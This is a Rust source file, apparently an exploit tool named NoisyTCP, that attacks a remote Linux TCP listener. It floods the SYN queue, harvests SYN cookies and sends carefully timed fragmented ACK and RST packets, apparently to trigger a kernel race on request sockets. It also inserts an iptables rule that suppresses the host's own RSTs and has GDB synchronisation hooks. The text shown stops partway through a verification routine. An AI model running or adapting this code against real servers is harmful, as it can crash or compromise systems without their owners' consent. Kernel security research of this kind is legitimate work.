#[cfg(target_os = "linux")]
mod platform {
    use crate::{Config, Mode};
    use std::collections::VecDeque;
    use std::ffi::{CStr, CString};
    use std::io;
    use std::mem;
    use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
    use std::os::fd::RawFd;
    use std::process::Command;
    use std::ptr;
    use std::sync::atomic::{AtomicBool, AtomicU16, AtomicU32, AtomicU64, Ordering};
    use std::sync::Arc;
    use std::thread::{self, JoinHandle};
    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

    const FIRST_FRAGMENT_LEN: usize = 8;
    const READER_PAYLOAD_LEN: usize = 16;
    const MAX_BACKLOG: usize = 4096;
    const MAX_BATCH: usize = 512;
    const FLAG_SYN: u8 = 0x02;
    const FLAG_RST: u8 = 0x04;
    const FLAG_ACK: u8 = 0x10;

    static STOP: AtomicBool = AtomicBool::new(false);

    extern "C" fn stop_signal(_: i32) {
        STOP.store(true, Ordering::Release);
    }

    #[derive(Default)]
    struct Stats {
        packets: u64,
        send_errors: u64,
        synacks: u64,
        cookies: u64,
        attempts: u64,
        rounds: u64,
        timeouts: u64,
        rst_leaks: u64,
    }

    struct RawSocket {
        fd: RawFd,
    }

    unsafe impl Send for RawSocket {}
    unsafe impl Sync for RawSocket {}

    impl RawSocket {
        fn open(domain: i32, socket_type: i32, protocol: i32) -> io::Result<Self> {
            let fd = unsafe { libc::socket(domain, socket_type, protocol) };
            if fd < 0 {
                return Err(raw_socket_error());
            }
            Ok(Self { fd })
        }

        fn sender(mark: u32) -> io::Result<Self> {
            let socket = Self::open(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW)?;
            let enabled: i32 = 1;
            let result = unsafe {
                libc::setsockopt(
                    socket.fd,
                    libc::IPPROTO_IP,
                    libc::IP_HDRINCL,
                    &enabled as *const i32 as *const libc::c_void,
                    mem::size_of_val(&enabled) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            if mark != 0 {
                let result = unsafe {
                    libc::setsockopt(
                        socket.fd,
                        libc::SOL_SOCKET,
                        libc::SO_MARK,
                        &mark as *const u32 as *const libc::c_void,
                        mem::size_of_val(&mark) as libc::socklen_t,
                    )
                };
                if result < 0 {
                    return Err(io::Error::last_os_error());
                }
            }
            Ok(socket)
        }

        fn packet_receiver(interface_index: i32) -> io::Result<Self> {
            let protocol = (libc::ETH_P_ALL as u16).to_be() as i32;
            let socket = Self::open(libc::AF_PACKET, libc::SOCK_RAW, protocol)?;
            let receive_buffer: i32 = 16 * 1024 * 1024;
            unsafe {
                libc::setsockopt(
                    socket.fd,
                    libc::SOL_SOCKET,
                    libc::SO_RCVBUF,
                    &receive_buffer as *const i32 as *const libc::c_void,
                    mem::size_of_val(&receive_buffer) as libc::socklen_t,
                );
            }
            let timeout = libc::timeval {
                tv_sec: 0,
                tv_usec: 100_000,
            };
            let result = unsafe {
                libc::setsockopt(
                    socket.fd,
                    libc::SOL_SOCKET,
                    libc::SO_RCVTIMEO,
                    &timeout as *const libc::timeval as *const libc::c_void,
                    mem::size_of_val(&timeout) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            let address = libc::sockaddr_ll {
                sll_family: libc::AF_PACKET as u16,
                sll_protocol: (libc::ETH_P_ALL as u16).to_be(),
                sll_ifindex: interface_index,
                sll_hatype: 0,
                sll_pkttype: 0,
                sll_halen: 0,
                sll_addr: [0; 8],
            };
            let result = unsafe {
                libc::bind(
                    socket.fd,
                    &address as *const libc::sockaddr_ll as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if result < 0 {
                return Err(io::Error::last_os_error());
            }
            Ok(socket)
        }

        fn send(&self, packet: &[u8], target: Ipv4Addr) -> io::Result<()> {
            let address = socket_address(target);
            let sent = unsafe {
                libc::sendto(
                    self.fd,
                    packet.as_ptr() as *const libc::c_void,
                    packet.len(),
                    0,
                    &address as *const libc::sockaddr_in as *const libc::sockaddr,
                    mem::size_of_val(&address) as libc::socklen_t,
                )
            };
            if sent < 0 {
                Err(io::Error::last_os_error())
            } else if sent as usize == packet.len() {
                Ok(())
            } else {
                Err(io::Error::new(
                    io::ErrorKind::WriteZero,
                    "raw socket sent a partial packet",
                ))
            }
        }

        fn receive_from(&self, buffer: &mut [u8]) -> io::Result<(usize, libc::sockaddr_ll)> {
            let mut address: libc::sockaddr_ll = unsafe { mem::zeroed() };
            let mut address_length = mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t;
            let received = unsafe {
                libc::recvfrom(
                    self.fd,
                    buffer.as_mut_ptr() as *mut libc::c_void,
                    buffer.len(),
                    0,
                    &mut address as *mut libc::sockaddr_ll as *mut libc::sockaddr,
                    &mut address_length,
                )
            };
            if received < 0 {
                Err(io::Error::last_os_error())
            } else {
                Ok((received as usize, address))
            }
        }
    }

    impl Drop for RawSocket {
        fn drop(&mut self) {
            unsafe {
                libc::close(self.fd);
            }
        }
    }

    #[derive(Clone, Copy, Default)]
    struct Segment {
        flags: u8,
        sequence: u32,
        acknowledgment: u32,
    }

    struct SegmentState {
        counts: Vec<AtomicU64>,
        sequences: Vec<AtomicU32>,
        acknowledgments: Vec<AtomicU32>,
        flags: Vec<AtomicU32>,
        synacks: AtomicU64,
        watch_port: AtomicU16,
        rst_seen: AtomicBool,
    }

    impl SegmentState {
        fn new() -> Self {
            Self {
                counts: (0..65_536).map(|_| AtomicU64::new(0)).collect(),
                sequences: (0..65_536).map(|_| AtomicU32::new(0)).collect(),
                acknowledgments: (0..65_536).map(|_| AtomicU32::new(0)).collect(),
                flags: (0..65_536).map(|_| AtomicU32::new(0)).collect(),
                synacks: AtomicU64::new(0),
                watch_port: AtomicU16::new(0),
                rst_seen: AtomicBool::new(false),
            }
        }

        fn mark(&self, port: u16) -> u64 {
            self.counts[usize::from(port)].load(Ordering::Acquire)
        }

        fn read(&self, port: u16) -> (u64, Segment) {
            let index = usize::from(port);
            let segment = Segment {
                flags: self.flags[index].load(Ordering::Relaxed) as u8,
                sequence: self.sequences[index].load(Ordering::Relaxed),
                acknowledgment: self.acknowledgments[index].load(Ordering::Relaxed),
            };
            (self.counts[index].load(Ordering::Acquire), segment)
        }
    }

    struct Sniffer {
        state: Arc<SegmentState>,
        thread: Option<JoinHandle<()>>,
    }

    impl Sniffer {
        fn start(
            interface_index: i32,
            source: Ipv4Addr,
            target: Ipv4Addr,
            target_port: u16,
            debug: bool,
        ) -> io::Result<Self> {
            let socket = Arc::new(RawSocket::packet_receiver(interface_index)?);
            let state = Arc::new(SegmentState::new());
            let thread_socket = Arc::clone(&socket);
            let thread_state = Arc::clone(&state);
            let thread = thread::spawn(move || {
                let mut buffer = [0u8; 65_535];
                let mut frames = 0u64;
                while !STOP.load(Ordering::Acquire) {
                    match thread_socket.receive_from(&mut buffer) {
                        Ok((length, address)) => {
                            frames += 1;
                            handle_frame(
                                &buffer[..length],
                                &address,
                                source,
                                target,
                                target_port,
                                &thread_state,
                                debug && frames <= 16,
                            );
                        }
                        Err(error)
                            if matches!(
                                error.kind(),
                                io::ErrorKind::WouldBlock
                                    | io::ErrorKind::TimedOut
                                    | io::ErrorKind::Interrupted
                            ) => {}
                        Err(_) => thread::sleep(Duration::from_millis(1)),
                    }
                }
            });
            Ok(Self {
                state,
                thread: Some(thread),
            })
        }
    }

    impl Drop for Sniffer {
        fn drop(&mut self) {
            STOP.store(true, Ordering::Release);
            if let Some(thread) = self.thread.take() {
                let _ = thread.join();
            }
        }
    }

    fn handle_frame(
        frame: &[u8],
        address: &libc::sockaddr_ll,
        source: Ipv4Addr,
        target: Ipv4Addr,
        target_port: u16,
        state: &SegmentState,
        debug: bool,
    ) {
        if frame.len() < 14 {
            return;
        }
        let mut ethernet_type = u16::from_be_bytes([frame[12], frame[13]]);
        let mut offset = 14;
        if ethernet_type == 0x8100 && frame.len() >= 18 {
            ethernet_type = u16::from_be_bytes([frame[16], frame[17]]);
            offset = 18;
        }
        if ethernet_type != libc::ETH_P_IP as u16 || frame.len() < offset + 40 {
            return;
        }
        let ip = &frame[offset..];
        if ip[0] >> 4 != 4 || ip[9] != libc::IPPROTO_TCP as u8 {
            return;
        }
        let ip_header = usize::from(ip[0] & 0x0f) * 4;
        if ip_header < 20 || ip.len() < ip_header + 20 {
            return;
        }
        let fragment = u16::from_be_bytes([ip[6], ip[7]]);
        if fragment & 0x3fff != 0 {
            return;
        }
        let tcp = &ip[ip_header..];
        let source_address = &ip[12..16];
        let destination_address = &ip[16..20];
        let source_port = u16::from_be_bytes([tcp[0], tcp[1]]);
        let destination_port = u16::from_be_bytes([tcp[2], tcp[3]]);
        let flags = tcp[13];
        if debug {
            eprintln!(
                "[dbg] tcp {source_port}->{destination_port} flags=0x{flags:02x} out={}",
                address.sll_pkttype == libc::PACKET_OUTGOING
            );
        }
        if address.sll_pkttype == libc::PACKET_OUTGOING {
            let watch = state.watch_port.load(Ordering::Relaxed);
            if watch != 0
                && source_address == source.octets()
                && destination_address == target.octets()
                && source_port == watch
                && destination_port == target_port
                && flags & (FLAG_RST | FLAG_ACK) == FLAG_RST
            {
                state.rst_seen.store(true, Ordering::Release);
            }
            return;
        }
        if source_address != target.octets()
            || destination_address != source.octets()
            || source_port != target_port
        {
            return;
        }
        let index = usize::from(destination_port);
        let sequence = u32::from_be_bytes([tcp[4], tcp[5], tcp[6], tcp[7]]);
        let acknowledgment = u32::from_be_bytes([tcp[8], tcp[9], tcp[10], tcp[11]]);
        if flags & (FLAG_SYN | FLAG_ACK) == FLAG_SYN | FLAG_ACK {
            state.synacks.fetch_add(1, Ordering::Relaxed);
        }
        state.sequences[index].store(sequence, Ordering::Relaxed);
        state.acknowledgments[index].store(acknowledgment, Ordering::Relaxed);
        state.flags[index].store(u32::from(flags), Ordering::Relaxed);
        state.counts[index].fetch_add(1, Ordering::Release);
    }

    struct RstFilter {
        iptables: Option<std::path::PathBuf>,
        arguments: Vec<String>,
        installed: bool,
    }

    impl RstFilter {
        fn install(config: &Config) -> io::Result<Self> {
            if config.no_rst_filter {
                return Ok(Self {
                    iptables: None,
                    arguments: Vec::new(),
                    installed: false,
                });
            }
            if config.mark == 0 {
                return Err(invalid_input(
                    "the automatic RST filter requires a nonzero --mark",
                ));
            }
            let iptables = ["/usr/sbin/iptables", "/sbin/iptables", "/usr/bin/iptables"]
                .into_iter()
                .map(std::path::PathBuf::from)
                .find(|path| path.exists())
                .ok_or_else(|| {
                    io::Error::new(
                        io::ErrorKind::NotFound,
                        "iptables is required for automatic RST suppression; install it or use --no-rst-filter with an equivalent nftables rule",
                    )
                })?;
            let last_port = usize::from(config.source_port) + config.source_port_count - 1;
            let arguments = vec![
                "OUTPUT".into(),
                "-p".into(),
                "tcp".into(),
                "--sport".into(),
                format!("{}:{last_port}", config.source_port),
                "--tcp-flags".into(),
                "RST".into(),
                "RST".into(),
                "-m".into(),
                "mark".into(),
                "!".into(),
                "--mark".into(),
                format!("0x{:x}", config.mark),
                "-j".into(),
                "DROP".into(),
            ];
            let exists = Command::new(&iptables)
                .arg("-w")
                .arg("2")
                .arg("-C")
                .args(&arguments)
                .output()
                .map(|output| output.status.success())
                .unwrap_or(false);
            if exists {
                return Ok(Self {
                    iptables: Some(iptables),
                    arguments,
                    installed: false,
                });
            }
            let output = Command::new(&iptables)
                .arg("-w")
                .arg("2")
                .arg("-I")
                .args(&arguments)
                .output()?;
            if !output.status.success() {
                return Err(io::Error::other(format!(
                    "cannot install the OUTPUT RST filter: {}",
                    String::from_utf8_lossy(&output.stderr).trim()
                )));
            }
            println!("[*] temporary host-RST filter installed");
            Ok(Self {
                iptables: Some(iptables),
                arguments,
                installed: true,
            })
        }
    }

    impl Drop for RstFilter {
        fn drop(&mut self) {
            if self.installed {
                if let Some(iptables) = &self.iptables {
                    let _ = Command::new(iptables)
                        .arg("-w")
                        .arg("2")
                        .arg("-D")
                        .args(&self.arguments)
                        .status();
                }
            }
        }
    }

    #[derive(Clone, Copy)]
    struct JunkRequest {
        port: u16,
        sequence: u32,
    }

    struct SegmentSpec {
        source_port: u16,
        sequence: u32,
        acknowledgment: u32,
        flags: u8,
        mss: bool,
        payload_len: usize,
    }

    #[derive(Clone, Copy, Default)]
    struct Target {
        port: u16,
        harvest_sequence: u32,
        request_sequence: u32,
        cookie: Option<u32>,
        mark: u64,
        packet_id: u16,
    }

    struct Engine {
        config: Config,
        source: Ipv4Addr,
        sender: RawSocket,
        sniffer: Sniffer,
        _filter: RstFilter,
        next_source_port: usize,
        packet_id: u16,
        random_state: u64,
        junk: VecDeque<JunkRequest>,
        previous: Vec<Target>,
        synack_timeout: Duration,
        calibrated_fill: usize,
        stats: Stats,
    }

    impl Engine {
        fn new(
            config: Config,
            source: Ipv4Addr,
            sender: RawSocket,
            sniffer: Sniffer,
            filter: RstFilter,
        ) -> Self {
            let seed = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos() as u64
                ^ u64::from(std::process::id());
            Self {
                config,
                source,
                sender,
                sniffer,
                _filter: filter,
                next_source_port: 0,
                packet_id: 0x4e00,
                random_state: seed | 1,
                junk: VecDeque::new(),
                previous: Vec::new(),
                synack_timeout: Duration::from_millis(100),
                calibrated_fill: 0,
                stats: Stats::default(),
            }
        }

        fn random_u32(&mut self) -> u32 {
            let mut value = self.random_state;
            value ^= value >> 12;
            value ^= value << 25;
            value ^= value >> 27;
            self.random_state = value;
            (value.wrapping_mul(0x2545_f491_4f6c_dd1d) >> 32) as u32
        }

        fn random_range(&mut self, limit: u64) -> u64 {
            if limit <= 1 {
                0
            } else {
                u64::from(self.random_u32()) % limit
            }
        }

        fn take_source_port(&mut self) -> u16 {
            if self.next_source_port >= self.config.source_port_count {
                self.next_source_port = 0;
            }
            let port = usize::from(self.config.source_port) + self.next_source_port;
            self.next_source_port += 1;
            port as u16
        }

        fn next_packet_id(&mut self) -> u16 {
            self.packet_id = self.packet_id.wrapping_add(1);
            self.packet_id
        }

        fn transmit(&mut self, packet: &[u8]) -> bool {
            match self.sender.send(packet, self.config.target) {
                Ok(()) => {
                    self.stats.packets += 1;
                    true
                }
                Err(error) => {
                    self.stats.send_errors += 1;
                    if self.config.debug && self.stats.send_errors <= 8 {
                        eprintln!("[dbg] sendto: {error}");
                    }
                    false
                }
            }
        }

        fn send_segment(
            &mut self,
            port: u16,
            sequence: u32,
            acknowledgment: u32,
            flags: u8,
            mss: bool,
            payload_len: usize,
        ) -> bool {
            let tcp = tcp_packet(
                self.source,
                self.config.target,
                self.config.port,
                SegmentSpec {
                    source_port: port,
                    sequence,
                    acknowledgment,
                    flags,
                    mss,
                    payload_len,
                },
            );
            let id = self.next_packet_id();
            let packet = ipv4_packet(self.source, self.config.target, id, 0, false, &tcp);
            self.transmit(&packet)
        }

        fn send_fragment(
            &mut self,
            port: u16,
            sequence: u32,
            acknowledgment: u32,
            flags: u8,
            payload_len: usize,
            packet_id: u16,
            first: bool,
        ) -> bool {
            let tcp = tcp_packet(
                self.source,
                self.config.target,
                self.config.port,
                SegmentSpec {
                    source_port: port,
                    sequence,
                    acknowledgment,
                    flags,
                    mss: false,
                    payload_len,
                },
            );
            let packet = if first {
                ipv4_packet(
                    self.source,
                    self.config.target,
                    packet_id,
                    0,
                    true,
                    &tcp[..FIRST_FRAGMENT_LEN],
                )
            } else {
                ipv4_packet(
                    self.source,
                    self.config.target,
                    packet_id,
                    FIRST_FRAGMENT_LEN,
                    false,
                    &tcp[FIRST_FRAGMENT_LEN..],
                )
            };
            self.transmit(&packet)
        }

        fn wait_synack(
            &mut self,
            port: u16,
            sent_sequence: u32,
            mut mark: u64,
            timeout: Duration,
        ) -> Option<u32> {
            let deadline = Instant::now() + timeout;
            loop {
                let (count, segment) = self.sniffer.state.read(port);
                if count != mark {
                    mark = count;
                    if segment.flags & (FLAG_SYN | FLAG_ACK) == FLAG_SYN | FLAG_ACK
                        && segment.acknowledgment == sent_sequence.wrapping_add(1)
                    {
                        return Some(segment.sequence);
                    }
                }
                if Instant::now() >= deadline || STOP.load(Ordering::Acquire) {
                    self.stats.timeouts += 1;
                    return None;
                }
                thread::sleep(Duration::from_micros(50));
            }
        }

        fn wait_segment(&mut self, port: u16, mut mark: u64, timeout: Duration) -> Option<Segment> {
            let deadline = Instant::now() + timeout;
            loop {
                let (count, segment) = self.sniffer.state.read(port);
                if count != mark {
                    return Some(segment);
                }
                if Instant::now() >= deadline || STOP.load(Ordering::Acquire) {
                    self.stats.timeouts += 1;
                    return None;
                }
                mark = count;
                thread::sleep(Duration::from_micros(50));
            }
        }

        fn probe_request(
            &mut self,
            timeout: Duration,
            watch_rst: bool,
        ) -> io::Result<Option<(u32, Duration, bool)>> {
            let port = self.take_source_port();
            let sequence = self.random_u32();
            if watch_rst {
                self.sniffer.state.rst_seen.store(false, Ordering::Release);
                self.sniffer.state.watch_port.store(port, Ordering::Release);
            }
            let mark = self.sniffer.state.mark(port);
            let started = Instant::now();
            if !self.send_segment(port, sequence, 0, FLAG_SYN, true, 0) {
                if watch_rst {
                    self.sniffer.state.watch_port.store(0, Ordering::Release);
                }
                return Err(io::Error::last_os_error());
            }
            let response = self.wait_synack(port, sequence, mark, timeout);
            let rtt = started.elapsed();
            if watch_rst && response.is_some() {
                thread::sleep(Duration::from_millis(100));
            }
            let leaked = watch_rst && self.sniffer.state.rst_seen.load(Ordering::Acquire);
            if watch_rst {
                self.sniffer.state.watch_port.store(0, Ordering::Release);
            }
            self.send_segment(port, sequence.wrapping_add(1), 0, FLAG_RST, false, 0);
            Ok(response.map(|server_sequence| (server_sequence, rtt, leaked)))
        }

        fn probe_fragment(&mut self) -> Option<u32> {
            let port = self.take_source_port();
            let sequence = self.random_u32();
            let packet_id = self.next_packet_id();
            let mark = self.sniffer.state.mark(port);
            self.send_fragment(
                port,
                sequence,
                0,
                FLAG_SYN,
                READER_PAYLOAD_LEN,
                packet_id,
                true,
            );
            self.spin_gap(self.config.frag_gap_us);
            self.send_fragment(
                port,
                sequence,
                0,
                FLAG_SYN,
                READER_PAYLOAD_LEN,
                packet_id,
                false,
            );
            let response = self.wait_synack(port, sequence, mark, Duration::from_secs(2));
            self.send_segment(
                port,
                sequence.wrapping_add(1 + READER_PAYLOAD_LEN as u32),
                0,
                FLAG_RST,
                false,
                0,
            );
            response
        }

        fn leak_check(&mut self) -> io::Result<()> {
            let result = self.probe_request(Duration::from_secs(2), true)?;
            let leaked = result.map(|(_, _, leaked)| leaked).unwrap_or(false);
            if leaked {
                self.stats.rst_leaks += 1;
            }
            if leaked && !self.config.assume_ok {
                let last_port =
                    usize::from(self.config.source_port) + self.config.source_port_count - 1;
                return Err(io::Error::other(format!(
                    "the local kernel answered SYN-ACK with RST; suppress it with: iptables -I OUTPUT -p tcp --sport {}:{last_port} --tcp-flags RST RST -m mark ! --mark 0x{:x} -j DROP (or let the automatic filter install it)",
                    self.config.source_port, self.config.mark
                )));
            }
            if leaked {
                println!("[!] host RST leak ignored because --assume-ok was supplied");
            } else {
                println!("[+] no host-generated RST detected");
            }
            Ok(())
        }

        fn auto_tune_timeout(&mut self) -> io::Result<()> {
            if let Some(milliseconds) = self.config.synack_ms {
                self.synack_timeout = Duration::from_millis(milliseconds);
                return Ok(());
            }
            let response = self.probe_request(Duration::from_secs(2), false)?;
            let Some((_, rtt, _)) = response else {
                return Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    format!(
                        "no valid SYN-ACK from {}:{} within 2 seconds",
                        self.config.target, self.config.port
                    ),
                ));
            };
            let milliseconds = (rtt.as_millis() as u64)
                .saturating_mul(4)
                .saturating_add(10)
                .clamp(10, 2_000);
            self.synack_timeout = Duration::from_millis(milliseconds);
            println!(
                "[*] RTT={:.3} ms, SYN-ACK timeout={milliseconds} ms",
                rtt.as_secs_f64() * 1000.0
            );
            Ok(())
        }

        fn junk_fill(&mut self, count: usize) {
            for _ in 0..count {
                let port = self.take_source_port();
                let sequence = self.random_u32();
                self.send_segment(port, sequence, 0, FLAG_SYN, true, 0);
                self.junk.push_back(JunkRequest { port, sequence });
            }
        }

        fn junk_drain(&mut self, count: usize) {
            for _ in 0..count {
                let Some(request) = self.junk.pop_front() else {
                    break;
                };
                self.send_segment(
                    request.port,
                    request.sequence.wrapping_add(1),
                    0,
                    FLAG_RST,
                    false,
                    0,
                );
            }
        }

        fn junk_drain_all(&mut self) {
            self.junk_drain(self.junk.len());
        }

        fn settle(&self) {
            if self.config.settle_us > 0 {
                thread::sleep(Duration::from_micros(self.config.settle_us));
            }
        }

        fn spin_gap(&mut self, base: u64) {
            let delay = base + self.random_range(self.config.jitter_us + 1);
            if delay == 0 {
                return;
            }
            let started = Instant::now();
            while started.elapsed() < Duration::from_micros(delay) {
                std::hint::spin_loop();
            }
        }

        fn probe_tuple(&mut self, port: u16, request_sequence: u32, cleanup: bool) -> i32 {
            let probe_sequence = request_sequence.wrapping_add(0x8000_0000);
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, probe_sequence, 0, FLAG_SYN, true, 0);
            let response = self.wait_segment(port, mark, self.synack_timeout);
            if cleanup {
                self.send_segment(port, probe_sequence.wrapping_add(1), 0, FLAG_RST, false, 0);
                self.send_segment(
                    port,
                    request_sequence.wrapping_add(1),
                    0,
                    FLAG_RST,
                    false,
                    0,
                );
            }
            match response {
                Some(segment) if segment.flags & FLAG_SYN != 0 => 0,
                Some(segment) if segment.flags & FLAG_ACK != 0 => 1,
                _ => -1,
            }
        }

        fn calibrate_fill(&mut self) -> io::Result<usize> {
            if let Some(backlog) = self.config.backlog {
                self.calibrated_fill = backlog;
                self.junk_fill(backlog);
                self.settle();
                println!("[*] using configured SYN backlog={backlog}");
                return Ok(backlog);
            }
            let maximum = MAX_BACKLOG.min(self.config.source_port_count / 4);
            let mut low = 1usize;
            let mut high = maximum;
            let mut saturated = false;
            for _ in 0..16 {
                if low >= high {
                    break;
                }
                let middle = low + (high - low) / 2;
                let mut result = -1;
                for attempt in 0..4 {
                    self.junk_drain_all();
                    self.settle();
                    self.junk_fill(middle);
                    let settling = self.config.settle_us * (1 + middle as u64 / 256);
                    thread::sleep(Duration::from_micros(settling));
                    let port = self.take_source_port();
                    let sequence = self.random_u32();
                    let mark = self.sniffer.state.mark(port);
                    self.send_segment(port, sequence, 0, FLAG_SYN, true, 0);
                    let timeout = self
                        .synack_timeout
                        .checked_mul(1 << attempt)
                        .unwrap_or(Duration::from_secs(4))
                        .min(Duration::from_secs(4));
                    if self.wait_synack(port, sequence, mark, timeout).is_none() {
                        continue;
                    }
                    self.settle();
                    result = self.probe_tuple(port, sequence, true);
                    if result >= 0 {
                        break;
                    }
                }
                if result < 0 {
                    self.junk_drain_all();
                    return Err(io::Error::new(
                        io::ErrorKind::TimedOut,
                        "SYN queue calibration failed: no usable probe response",
                    ));
                }
                if self.config.debug {
                    println!("[dbg] calibration fill={middle} request_present={result}");
                }
                if result == 1 {
                    low = middle + 1;
                } else {
                    saturated = true;
                    high = middle;
                }
            }
            self.junk_drain_all();
            if !saturated {
                return Err(io::Error::other(format!(
                    "SYN queue did not saturate up to {maximum}; SYN cookies may be disabled or the listener backlog is larger"
                )));
            }
            if low <= 1 {
                self.junk_drain_all();
                return Err(io::Error::other(
                    "the listener returns cookies immediately (tcp_syncookies=2); this request-queue mode requires tcp_syncookies=1",
                ));
            }
            self.calibrated_fill = low;
            self.junk_fill(low);
            self.settle();
            println!("[+] SYN queue saturates at {low} pending requests");
            Ok(low)
        }

        fn cleanup_previous(&mut self) {
            for index in 0..self.previous.len() {
                let target = self.previous[index];
                if target.harvest_sequence != 0 {
                    self.send_segment(
                        target.port,
                        target.harvest_sequence.wrapping_add(1),
                        0,
                        FLAG_RST,
                        false,
                        0,
                    );
                }
                if target.request_sequence != 0 {
                    self.send_segment(
                        target.port,
                        target.request_sequence.wrapping_add(1),
                        0,
                        FLAG_RST,
                        false,
                        0,
                    );
                }
            }
            self.previous.clear();
        }

        fn run_round(&mut self, batch: usize) {
            if let Ok(path) = std::env::var("NOISYTCP_GDB_TUPLE") {
                let _ = std::fs::remove_file(path);
            }
            self.cleanup_previous();
            self.junk_drain_all();
            self.settle();
            let fill = self.calibrated_fill;
            self.junk_fill(fill);
            self.settle();

            let mut targets = Vec::with_capacity(batch);
            for _ in 0..batch {
                let port = self.take_source_port();
                let harvest_sequence = self.random_u32();
                let mark = self.sniffer.state.mark(port);
                self.send_segment(port, harvest_sequence, 0, FLAG_SYN, true, 0);
                targets.push(Target {
                    port,
                    harvest_sequence,
                    mark,
                    ..Target::default()
                });
            }
            let deadline = Instant::now() + self.synack_timeout;
            loop {
                let mut received = 0usize;
                for target in &mut targets {
                    if target.cookie.is_some() {
                        received += 1;
                        continue;
                    }
                    let (count, segment) = self.sniffer.state.read(target.port);
                    if count == target.mark {
                        continue;
                    }
                    target.mark = count;
                    if segment.flags & (FLAG_SYN | FLAG_ACK) == FLAG_SYN | FLAG_ACK
                        && segment.acknowledgment == target.harvest_sequence.wrapping_add(1)
                    {
                        target.cookie = Some(segment.sequence);
                        received += 1;
                    }
                }
                if received == batch || Instant::now() >= deadline || STOP.load(Ordering::Acquire) {
                    self.stats.cookies += received as u64;
                    break;
                }
                thread::sleep(Duration::from_micros(50));
            }

            self.junk_drain_all();
            self.settle();
            for target in &mut targets {
                if target.cookie.is_none() {
                    continue;
                }
                target.request_sequence = self.random_u32();
                self.send_segment(target.port, target.request_sequence, 0, FLAG_SYN, true, 0);
            }
            self.settle();

            let mut live = 0u64;
            for target in &mut targets {
                if target.cookie.is_none() {
                    continue;
                }
                target.packet_id = self.next_packet_id();
                if let Ok(path) = std::env::var("NOISYTCP_GDB_TUPLE") {
                    if std::fs::write(path, target.port.to_string()).is_err() {
                        eprintln!("NoisyTCP failed: cannot publish the GDB tuple");
                        STOP.store(true, Ordering::Release);
                        return;
                    }
                    thread::sleep(Duration::from_millis(50));
                }
                self.send_fragment(
                    target.port,
                    target.request_sequence.wrapping_add(1),
                    0,
                    FLAG_ACK,
                    READER_PAYLOAD_LEN,
                    target.packet_id,
                    true,
                );
                live += 1;
            }
            if live > 0 {
                self.spin_gap(self.config.frag_gap_us);
                for target in &targets {
                    let target = *target;
                    if target.cookie.is_none() {
                        continue;
                    }
                    self.send_fragment(
                        target.port,
                        target.request_sequence.wrapping_add(1),
                        0,
                        FLAG_ACK,
                        READER_PAYLOAD_LEN,
                        target.packet_id,
                        false,
                    );
                    for _ in 1..self.config.readers {
                        let packet_id = self.next_packet_id();
                        self.send_fragment(
                            target.port,
                            target.request_sequence.wrapping_add(1),
                            0,
                            FLAG_ACK,
                            READER_PAYLOAD_LEN,
                            packet_id,
                            true,
                        );
                        self.send_fragment(
                            target.port,
                            target.request_sequence.wrapping_add(1),
                            0,
                            FLAG_ACK,
                            READER_PAYLOAD_LEN,
                            packet_id,
                            false,
                        );
                    }
                    if let Ok(path) = std::env::var("NOISYTCP_GDB_SYNC") {
                        let path = std::path::Path::new(&path);
                        let deadline = Instant::now() + Duration::from_secs(5);
                        while !path.exists() && Instant::now() < deadline {
                            thread::sleep(Duration::from_micros(50));
                        }
                        if std::fs::remove_file(path).is_err() {
                            eprintln!("NoisyTCP failed: GDB synchronization timed out");
                            STOP.store(true, Ordering::Release);
                            return;
                        }
                    }
                    if let Ok(path) = std::env::var("NOISYTCP_GDB_TUPLE") {
                        let _ = std::fs::remove_file(path);
                    }
                    self.spin_gap(self.config.free_gap_us);
                    self.send_segment(
                        target.port,
                        target.request_sequence.wrapping_add(1),
                        0,
                        FLAG_RST,
                        false,
                        0,
                    );
                    self.spin_gap(self.config.alloc_gap_us);
                    self.send_segment(
                        target.port,
                        target.harvest_sequence.wrapping_add(1),
                        target.cookie.unwrap().wrapping_add(1),
                        FLAG_ACK,
                        false,
                        0,
                    );
                    self.send_segment(
                        target.port,
                        target.harvest_sequence.wrapping_add(1),
                        0,
                        FLAG_RST,
                        false,
                        0,
                    );
                }
                self.stats.attempts += live;
            }
            self.previous = targets;
            self.stats.rounds += 1;
        }

        fn mode_probe(&mut self) -> io::Result<()> {
            let response = self.probe_request(Duration::from_secs(2), true)?;
            let Some((server_sequence, rtt, leaked)) = response else {
                return Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    "no valid SYN-ACK; check the listener, route and packet filter",
                ));
            };
            println!(
                "[+] SYN-ACK received: server_isn=0x{server_sequence:08x} rtt={:.3} ms",
                rtt.as_secs_f64() * 1000.0
            );
            if leaked && !self.config.assume_ok {
                return Err(io::Error::other(
                    "the local kernel leaked an in-window RST; the automatic filter did not suppress it",
                ));
            }
            if leaked {
                println!("[!] host-generated RST detected and ignored (--assume-ok)");
            } else {
                println!("[+] no host-generated RST detected");
            }
            let fragmented = self.probe_fragment().ok_or_else(|| {
                io::Error::new(
                    io::ErrorKind::TimedOut,
                    "no SYN-ACK for the fragmented SYN; the path drops or reassembles IPv4 fragments",
                )
            })?;
            println!("[+] fragmented SYN-ACK received: server_isn=0x{fragmented:08x}");
            Ok(())
        }

        fn mode_verify(&mut self) -> io::Result<()> {
            self.leak_check()?;
            self.auto_tune_timeout()?;
            println!("[1/5] calibrating and saturating the SYN queue");
            self.calibrate_fill()?;

            println!("[2/5] harvesting a SYN cookie");
            let port = self.take_source_port();
            let harvest_sequence = self.random_u32();
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, harvest_sequence, 0, FLAG_SYN, true, 0);
            let cookie = self
                .wait_synack(port, harvest_sequence, mark, self.synack_timeout)
                .ok_or_else(|| {
                    io::Error::new(io::ErrorKind::TimedOut, "no SYN-ACK for cookie harvest")
                })?;
            println!("      cookie=0x{cookie:08x}");

            println!("[3/5] freeing one queue slot and creating a hashed request socket");
            self.junk_drain(1);
            self.settle();
